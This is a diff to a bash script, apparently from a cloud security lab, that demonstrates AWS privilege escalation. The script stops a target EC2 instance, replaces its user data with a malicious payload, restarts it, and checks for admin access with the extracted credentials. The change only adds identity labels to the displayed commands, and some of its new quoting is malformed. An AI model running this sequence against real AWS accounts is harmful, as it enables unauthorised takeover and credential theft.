@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -88,7 +90,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -100,7 +102,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -108,7 +110,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -118,7 +120,7 @@ echo ""
 
 # Step 5: Find the target EC2 instance
 echo -e "${YELLOW}Step 5: Finding target EC2 instance${NC}"
-show_cmd aws ec2 describe-instances --region "$AWS_REGION" --filters "Name=tag:Name,Values=$TARGET_INSTANCE_TAG" "Name=instance-state-name,Values=running,stopped" --query 'Reservations[0].Instances[0].InstanceId' --output text
+show_cmd "Attacker" "aws ec2 describe-instances --region "$AWS_REGION" --filters "Name=tag:Name,Values=$TARGET_INSTANCE_TAG" "Name=instance-state-name,Values=running,stopped" --query 'Reservations[0].Instances[0].InstanceId' --output text"
 INSTANCE_ID=$(aws ec2 describe-instances \
     --region $AWS_REGION \
     --filters "Name=tag:Name,Values=$TARGET_INSTANCE_TAG" "Name=instance-state-name,Values=running,stopped" \
@@ -133,7 +135,7 @@ fi
 echo "Found target instance: $INSTANCE_ID"
 
 # Get the instance's IAM role
-show_cmd aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].IamInstanceProfile.Arn' --output text
+show_cmd "Attacker" "aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].IamInstanceProfile.Arn' --output text"
 INSTANCE_PROFILE=$(aws ec2 describe-instances \
     --region $AWS_REGION \
     --instance-ids $INSTANCE_ID \
@@ -147,7 +149,7 @@ echo -e "${GREEN}✓ Found target instance${NC}\n"
 echo -e "${YELLOW}Step 6: Backing up original instance user data${NC}"
 
 # Get the current user data (if any)
-show_cmd aws ec2 describe-instance-attribute --region "$AWS_REGION" --instance-id "$INSTANCE_ID" --attribute userData --query 'UserData.Value' --output text
+show_cmd "Attacker" "aws ec2 describe-instance-attribute --region "$AWS_REGION" --instance-id "$INSTANCE_ID" --attribute userData --query 'UserData.Value' --output text"
 ORIGINAL_USERDATA=$(aws ec2 describe-instance-attribute \
     --region $AWS_REGION \
     --instance-id $INSTANCE_ID \
@@ -211,7 +213,7 @@ echo -e "${YELLOW}Step 8: Stopping the EC2 instance${NC}"
 echo "Instance ID: $INSTANCE_ID"
 
 # Check current state
-show_cmd aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].State.Name' --output text
+show_cmd "Attacker" "aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].State.Name' --output text"
 CURRENT_STATE=$(aws ec2 describe-instances \
     --region $AWS_REGION \
     --instance-ids $INSTANCE_ID \
@@ -222,7 +224,7 @@ echo "Current state: $CURRENT_STATE"
 
 if [ "$CURRENT_STATE" = "running" ]; then
     echo "Stopping instance..."
-    show_attack_cmd aws ec2 stop-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --output text
+    show_attack_cmd "Attacker" "aws ec2 stop-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --output text"
     aws ec2 stop-instances \
         --region $AWS_REGION \
         --instance-ids $INSTANCE_ID \
@@ -251,7 +253,7 @@ MALICIOUS_USERDATA_FILE="/tmp/malicious_userdata.b64"
 echo "$MALICIOUS_PAYLOAD_B64" > "$MALICIOUS_USERDATA_FILE"
 
 # Modify the instance's user data attribute
-show_attack_cmd aws ec2 modify-instance-attribute --region "$AWS_REGION" --instance-id "$INSTANCE_ID" --attribute userData --value "file://$MALICIOUS_USERDATA_FILE"
+show_attack_cmd "Attacker" "aws ec2 modify-instance-attribute --region "$AWS_REGION" --instance-id "$INSTANCE_ID" --attribute userData --value "file://$MALICIOUS_USERDATA_FILE""
 aws ec2 modify-instance-attribute \
     --region $AWS_REGION \
     --instance-id $INSTANCE_ID \
@@ -264,7 +266,7 @@ echo -e "${GREEN}✓ User data modified successfully${NC}\n"
 echo -e "${YELLOW}Step 10: Starting the instance to trigger malicious payload${NC}"
 echo "The malicious user data will execute during boot..."
 
-show_attack_cmd aws ec2 start-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --output text
+show_attack_cmd "Attacker" "aws ec2 start-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --output text"
 aws ec2 start-instances \
     --region $AWS_REGION \
     --instance-ids $INSTANCE_ID \
@@ -330,7 +332,7 @@ else
     echo -e "${YELLOW}Step 13: Verifying administrator access with extracted credentials${NC}"
     echo "Attempting to list IAM users..."
 
-    show_cmd aws iam list-users --max-items 3 --output table
+    show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
     if aws iam list-users --max-items 3 --output table; then
         echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
         echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
